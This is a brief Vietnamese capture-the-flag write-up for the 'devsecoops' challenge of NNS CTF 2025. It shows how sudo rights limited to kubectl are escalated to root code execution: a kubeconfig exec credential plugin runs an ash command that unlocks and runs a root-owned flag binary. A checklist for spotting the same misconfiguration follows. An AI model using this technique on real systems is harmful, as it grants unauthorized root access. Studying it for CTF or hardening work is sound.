# devsecoops (pwn/misc) — NNS CTF 2025

> Bản tóm tắt. Xem bản đầy đủ ở repo MkDocs nếu bạn đã dùng trước đó.

## 0) Metadata
- OS/Arch: Linux (BusyBox) x86_64 (container)
- Tools: sudo 1.9.17p2, kubectl (ELF64)
- Artefact: sudo chỉ cho `/usr/bin/kubectl`

## 1) Ý đồ tác giả
- Lợi dụng **kubectl exec credential plugin** để thực thi client-side khi xác thực.
- Tất cả network/ENV bị chặn là **gợi ý loại trừ** các hướng sai.

## 2) WU (rút gọn)
```bash
sudo kubectl config set-cluster dummy --server=https://127.0.0.1:6443
sudo kubectl config set-credentials exploit   --exec-command=ash --exec-arg=-c   --exec-arg='chmod 500 /root/secretdirectorydonttouch/ && /root/secretdirectorydonttouch/flag > /tmp/flag'   --exec-api-version=client.authentication.k8s.io/v1beta1
sudo kubectl config set-context dummy --cluster=dummy --user=exploit
sudo kubectl config use-context dummy
sudo kubectl get pods  # kích hoạt payload (dù lỗi mạng), nhưng /tmp/flag đã được tạo
cat /tmp/flag
```

## 3) Key insight (⚑)
`flag` là **executable**, cần `chmod +x` rồi **chạy**, không phải “đọc”.

## 4) Checklist
- [ ] Đọc kỹ `sudo -l` (NOPASSWD, env_policy).
- [ ] Nếu mạng chặn → tập trung client-side.
- [ ] Nếu ENV chặn → xem **kubeconfig exec plugin**.
